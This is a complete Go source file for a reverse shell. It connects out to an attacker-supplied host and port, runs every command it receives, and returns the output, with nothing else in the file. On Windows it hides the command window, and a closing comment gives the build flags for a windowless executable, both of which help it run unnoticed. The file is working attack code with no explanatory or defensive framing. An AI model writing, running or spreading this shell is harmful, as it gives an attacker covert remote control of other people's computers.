package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
)

var (
	host string
	port int
)

func init() {
	flag.StringVar(&host, "host", "", "Hostname or IP address of the listener")
	flag.IntVar(&port, "port", 4444, "Port number of the listener")
	flag.Parse()
}

func getPrompt() string {
	dir, err := os.Getwd()
	if err != nil {
		return "Error retrieving directory"
	}
	baseDir := filepath.Base(dir)
	userDir := filepath.Dir(dir)
	_, userName := filepath.Split(userDir)

	if runtime.GOOS == "windows" {
		return fmt.Sprintf("%s@%s>", userName, baseDir)
	} else {
		return fmt.Sprintf("%s%s$", userName, baseDir)
	}
}

func main() {
	if host == "" {
		fmt.Println("Please provide a valid host using -host option")
		return
	}

	server := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.Dial("tcp", server)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	fmt.Println("Connected to", server)
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	for {
		fmt.Fprintf(conn, "%s ", getPrompt())
		if !scanner.Scan() {
			break
		}
		command := scanner.Text()
		if command == "exit" {
			fmt.Println("Exiting...")
			return
		}

		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			// On Windows, hide the window and execute commands silently
			cmd = exec.Command("cmd.exe", "/Q", "/C", command)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		} else {
			// On Unix-like systems, directly execute commands
			parts := strings.Fields(command)
			if len(parts) > 0 {
				cmd = exec.Command(parts[0], parts[1:]...)
			} else {
				fmt.Fprintf(conn, "Invalid command\n")
				continue
			}
		}

		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}
		fmt.Fprintf(conn, "%s\n", output)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading from server:", err)
	}
}

// GOOS=windows GOARCH=amd64 go build -ldflags "-H=windowsgui" -o reverse_shell.exe reverse-shell.go
